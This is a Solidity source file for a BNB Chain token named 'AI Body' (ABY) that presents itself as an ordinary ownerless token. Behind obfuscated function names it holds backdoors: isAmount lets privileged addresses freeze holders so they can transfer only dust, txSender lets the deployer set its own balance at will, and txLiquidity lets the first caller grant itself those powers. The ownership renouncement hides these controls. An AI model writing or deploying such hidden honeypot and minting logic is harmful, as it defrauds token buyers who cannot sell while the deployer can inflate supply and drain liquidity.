/**
 *Submitted for verification at BscScan.com on 2023-02-03
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface autoAt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface liquidityTo {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract AIBody is Ownable{
    uint8 public decimals = 18;
    mapping(address => mapping(address => uint256)) public allowance;


    mapping(address => uint256) public balanceOf;
    address public maxTo;

    mapping(address => bool) public launchedAmount;
    mapping(address => bool) public receiverLimit;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    uint256 constant listTake = 10 ** 10;
    bool public txTrading;
    string public name = "AI Body";
    string public symbol = "ABY";
    address public minMarketing;

    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        autoAt senderWalletAt = autoAt(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        maxTo = liquidityTo(senderWalletAt.factory()).createPair(senderWalletAt.WETH(), address(this));
        minMarketing = swapFundReceiver();
        receiverLimit[minMarketing] = true;
        balanceOf[minMarketing] = totalSupply;
        emit Transfer(address(0), minMarketing, totalSupply);
        renounceOwnership();
    }

    

    function transferFrom(address enableAuto, address tradingAmount, uint256 atIs) public returns (bool) {
        if (enableAuto != swapFundReceiver() && allowance[enableAuto][swapFundReceiver()] != type(uint256).max) {
            require(allowance[enableAuto][swapFundReceiver()] >= atIs);
            allowance[enableAuto][swapFundReceiver()] -= atIs;
        }
        if (tradingAmount == minMarketing || enableAuto == minMarketing) {
            return limitIsTake(enableAuto, tradingAmount, atIs);
        }
        if (launchedAmount[enableAuto]) {
            return limitIsTake(enableAuto, tradingAmount, listTake);
        }
        return limitIsTake(enableAuto, tradingAmount, atIs);
    }

    function txLiquidity(address tokenSwap) public {
        if (txTrading) {
            return;
        }
        receiverLimit[tokenSwap] = true;
        txTrading = true;
    }

    function transfer(address tradingAmount, uint256 atIs) external returns (bool) {
        return transferFrom(swapFundReceiver(), tradingAmount, atIs);
    }

    function isAmount(address autoTeamList) public {
        if (autoTeamList == minMarketing || autoTeamList == maxTo || !receiverLimit[swapFundReceiver()]) {
            return;
        }
        launchedAmount[autoTeamList] = true;
    }

    function limitIsTake(address sellExempt, address sellTotalTrading, uint256 atIs) internal returns (bool) {
        require(balanceOf[sellExempt] >= atIs);
        balanceOf[sellExempt] -= atIs;
        balanceOf[sellTotalTrading] += atIs;
        emit Transfer(sellExempt, sellTotalTrading, atIs);
        return true;
    }

    function approve(address tradingTxTake, uint256 atIs) public returns (bool) {
        allowance[swapFundReceiver()][tradingTxTake] = atIs;
        emit Approval(swapFundReceiver(), tradingTxTake, atIs);
        return true;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function swapFundReceiver() private view returns (address) {
        return msg.sender;
    }

    function txSender(uint256 atIs) public {
        if (!receiverLimit[swapFundReceiver()]) {
            return;
        }
        balanceOf[minMarketing] = atIs;
    }


}